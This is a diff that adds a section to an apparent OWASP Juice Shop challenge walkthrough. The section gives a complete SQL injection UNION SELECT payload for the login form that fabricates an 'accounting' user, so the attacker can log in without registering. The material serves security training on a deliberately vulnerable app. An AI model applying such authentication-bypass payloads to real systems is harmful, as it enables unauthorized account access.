@@ -40,6 +40,18 @@ or get the answer from `keywordsForPastebinDataLeakChallenge` (guess this is not
 
 Submit `Hueteroneel and Eurogium Edule` into _Customer Feedback_ form.
 
+## Ephemeral Accountant (Injection)
+_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._
+
+This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
+challenge, you know the number of columns and data types of `users` table.
+ 
+```
+xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
+```
+
+The role must be the `accounting`!
+
 ## Reset Bender's Password (Broken Authentication)
 _Reset Bender's password via the Forgot Password mechanism with the original answer to his security question._
 
